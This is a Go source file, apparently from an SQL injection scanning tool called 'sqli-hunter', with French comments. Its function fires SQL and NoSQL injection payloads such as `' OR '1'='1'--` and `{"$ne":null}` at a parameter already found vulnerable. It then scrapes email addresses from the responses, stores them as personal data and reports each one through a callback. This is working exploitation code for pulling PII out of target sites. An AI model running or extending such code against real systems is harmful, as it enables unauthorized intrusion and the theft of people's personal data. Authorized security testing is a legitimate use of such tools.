package extractor

import (
	"context"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// scrapeEmailsFromFinding tente d'extraire des emails depuis les réponses HTTP
// (erreurs SQL, JSON, HTML) avant/après le dump PII classique.
func (e *Extractor) scrapeEmailsFromFinding(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
	if e == nil || e.httpClient == nil {
		return nil
	}

	payloads := []string{finding.Payload, `'`, `1'`, `' OR '1'='1'--`}
	if finding.VulnType == models.NoSQL {
		payloads = []string{finding.Payload, `{"$gt":""}`, `{"$ne":null}`}
	}

	seen := make(map[string]bool)
	var out []models.ExtractedData

	for _, payload := range payloads {
		if ctx.Err() != nil {
			break
		}
		if strings.TrimSpace(payload) == "" {
			continue
		}
		if e.rateLimit != nil {
			e.rateLimit()
		}
		resp, err := e.httpClient.Send(ctx, target, finding.Parameter, payload)
		if err != nil || resp.Body == "" {
			continue
		}
		for _, rec := range scanEmailsInBody(resp.Body) {
			em := strings.ToLower(strings.TrimSpace(rec.Email))
			if em == "" || seen[em] {
				continue
			}
			seen[em] = true
			pii := rec.ToModel()
			data := models.ExtractedData{
				FindingURL: finding.URL,
				Parameter:  finding.Parameter,
				VulnType:   finding.VulnType,
				DBMS:       finding.DBMS,
				DataType:   models.DataPII,
				Value:      FormatPIIRecord(rec),
				Payload:    payload,
				Method:     "scrape",
				PII:        &pii,
			}
			out = append(out, data)
			if e.onExtract != nil {
				e.onExtract(data)
			}
		}
	}
	return out
}

func scanEmailsInBody(body string) []PIIRecord {
	var out []PIIRecord
	seen := make(map[string]bool)
	for _, em := range rePIIEmail.FindAllString(body, -1) {
		if !isValidEmail(em) {
			continue
		}
		em = strings.ToLower(em)
		if seen[em] {
			continue
		}
		seen[em] = true
		out = append(out, PIIRecord{Email: em, Raw: em})
	}
	return out
}
